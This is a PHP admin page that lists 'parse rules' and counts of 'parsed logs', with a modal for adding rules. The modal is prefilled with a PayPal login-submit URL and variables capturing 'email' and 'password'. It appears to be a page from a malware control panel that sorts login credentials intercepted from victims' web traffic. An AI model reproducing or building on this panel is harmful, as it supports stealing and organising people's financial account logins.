<?php

require_once('inc/require.php');
require_once('inc/load.php');
require_once('inc/head_new.inc');
require_once('inc/menu.html');

if(isset($_GET['delete_id']))
{
	mysql_query("DELETE FROM parsed_logs WHERE rule_id='".(int)$_GET['delete_id']."'");
	exit ('<script>location.href="?"</script>');
}

?>

			<section id="content">
				<div class="wrapper">
					<div class="crumb">
						<ul class="breadcrumb">
							<li><a href="#"><i class="icon16 i-home-4"></i>Home</a> <span class="divider">/</span></li>
							<li class="active">Parsed Logs</li>
						</ul>
					</div>
							
					<div class="container-fluid">
						<div id="heading" class="page-header">
							<h1><i class="icon20 i-table-2"></i> Parsed Logs</h1>
						</div>
					   
						<div class="row-fluid">
							<div class="span12">
								<div class="widget">
									<div class="widget-title">
										<div class="icon"><i class="icon20 i-table"></i></div> 
										<h4>Parsed Logs</h4>
										<a href="#" class="minimize"></a>
									</div>
					   
									<div class="widget-content">
										<span id="container">
											<table cellpadding="0" cellspacing="0" border="0" class="table table-striped table-bordered table-hover" id="dataTable">
												<thead>
													<tr>
														<th width="20%">Rule Name</th>
														<th width="20%">Entries</th>
														<th width="20%">Action</th>
													</tr>
												</thead>
												<tbody>
												<?php
													$objQuery= mysql_query("SELECT * FROM parse_rules");
													while($row = mysql_fetch_array($objQuery))
													{
														$num_entries = mysql_num_rows(mysql_query("SELECT id FROM parsed_logs WHERE rule_id='".(int)$row['id']."'"));
														
														echo("
																<tr class=\"gradeA\">
																	<td class=\"center vcenter\">".htmlspecialchars($row['name'])."</td>
																	<td class=\"center vcenter\">".$num_entries."</td>
																	<td class=\"center vcenter\">
																		<a href=\"viewparsedlog.php?rule_id=".$row['id']."\" class=\"btn tip\" >View Entries</i></a> 
																		<a href=\"?delete_id=".$row['id']."\" class=\"btn tip\" onClick=\"return confirm(\'You sure?\')\">Delete All Entries</i></a>
																	</td>
																</tr>
															");
													}
												?>
												</tbody>
											</table>	
										</span>  
									</div>
									
								</div>
							</div>                   
						</div>
								
								
						<a href="#myModal" id="myModalEvent" class="btn gap-right20" data-toggle="modal" style="display:None"></a>    
						<div id="myModal" class="modal hide fade" style="display: none;">
							<div class="modal-header">
								<button type="button" class="close" data-dismiss="modal"><i class="icon16 i-close-2"></i></button>
								<h4 id="modal_title">Add Rule</h4>
							</div>
							<div class="modal-body">
								<p><input type="text" style="width:500px;" id="name_area" value='Paypal rule 1'></p>
								<p><input type="text" style="width:500px;" id="url_area" value='http*://www.paypal.com/??/cgi-bin/webscr?cmd=_login-submit'></p>
								<p><input type="text" style="width:500px;" id="var_area" value='%VAR1%= "email"; %VAR2 = "password";'></p>
								<p>
									<textarea style="width:500px; height:232px" id="rule_area"></textarea>
								</p>
								<div class="modal-footer" id="parser-button-area">
									<a href="#" class="btn" data-dismiss="modal">Save</a> <a href="#" class="btn" data-dismiss="modal">Close</a>
								</div>
							</div>                                  
						</div>
						
					</div>
				</div>
			</section>
<?php
require_once('inc/foot.inc');
?>